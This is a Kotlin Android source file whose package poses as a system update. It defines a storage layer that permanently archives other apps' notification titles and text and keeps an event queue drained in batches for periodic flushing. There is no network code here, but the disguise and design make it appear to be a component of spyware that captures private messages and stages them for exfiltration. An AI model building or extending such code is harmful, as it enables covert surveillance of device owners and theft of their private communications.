package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object DataStore {

    private const val QUEUE_FILE = "queue.jsonl"
    private const val NOTIF_FILE = "notifications.jsonl"
    private const val MAX_QUEUE_BYTES = 30L * 1024 * 1024

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    private fun queueFile(ctx: Context): File {
        val f = File(ctx.filesDir, QUEUE_FILE)
        if (!f.exists()) f.createNewFile()
        return f
    }

    private fun notifFile(ctx: Context): File {
        val f = File(ctx.filesDir, NOTIF_FILE)
        if (!f.exists()) f.createNewFile()
        return f
    }

    // ═══════════ NOTIFICATIONS (separate storage, never deleted) ═══════════
    @Synchronized
    fun appendNotification(ctx: Context, obj: JSONObject) {
        try {
            val entry = JSONObject().apply {
                put("type", "notif")
                put("pkg", obj.optString("package", obj.optString("pkg", "unknown")))
                put("title", obj.optString("title", ""))
                put("text", obj.optString("text", ""))
                put("time", obj.optString("time", timeFmt.format(Date())))
            }
            val f = notifFile(ctx)
            if (f.length() > MAX_QUEUE_BYTES) {
                // rotate but keep last half
                val lines = f.readLines()
                val keep = lines.takeLast(lines.size / 2)
                f.writeText(keep.joinToString("\n").let { if (it.isEmpty()) "" else "$it\n" })
            }
            FileOutputStreamAppend(f, entry.toString())
        } catch (e: Exception) {
            Log.e("DataStore", "notif err: ${e.message}")
        }
    }

    // ═══════════ QUEUE (events for periodic flush) ═══════════
    @Synchronized
    fun appendAny(ctx: Context, obj: JSONObject) {
        try {
            val entry = JSONObject().apply {
                put("type", "event")
                put("data", obj)
            }
            append(ctx, entry.toString())
        } catch (e: Exception) {
            Log.e("DataStore", "any err: ${e.message}")
        }
    }

    private fun append(ctx: Context, line: String) {
        try {
            val f = queueFile(ctx)
            if (f.length() > MAX_QUEUE_BYTES) rotate(ctx)
            FileOutputStreamAppend(f, line)
        } catch (e: Exception) {
            Log.e("DataStore", "append err: ${e.message}")
        }
    }

    private fun FileOutputStreamAppend(f: File, line: String) {
        java.io.FileOutputStream(f, true).use { fos ->
            fos.write((line + "\n").toByteArray())
        }
    }

    private fun rotate(ctx: Context) {
        try {
            val f = queueFile(ctx)
            val rotated = File(ctx.filesDir, "queue.old.jsonl")
            if (rotated.exists()) rotated.delete()
            f.renameTo(rotated)
            f.createNewFile()
        } catch (_: Exception) {}
    }

    @Synchronized
    fun drain(ctx: Context, limit: Int = 1000): List<String> {
        val result = mutableListOf<String>()
        try {
            val f = queueFile(ctx)
            if (!f.exists()) return result
            val lines = f.readLines()
            val take = lines.take(limit)
            val keep = lines.drop(limit)
            result.addAll(take)
            f.writeText(keep.joinToString("\n").let { if (keep.isEmpty()) "" else "$it\n" })
        } catch (e: Exception) {
            Log.e("DataStore", "drain err: ${e.message}")
        }
        return result
    }

    // ═══════════ READ NOTIFICATIONS (without deleting) ═══════════
    @Synchronized
    fun readNotifications(ctx: Context, limit: Int = 5000): List<String> {
        val result = mutableListOf<String>()
        try {
            val f = notifFile(ctx)
            if (!f.exists()) return result
            val lines = f.readLines()
            result.addAll(lines.takeLast(limit))
        } catch (e: Exception) {
            Log.e("DataStore", "readNotif err: ${e.message}")
        }
        return result
    }

    fun stamp(): String = timeFmt.format(Date())
}
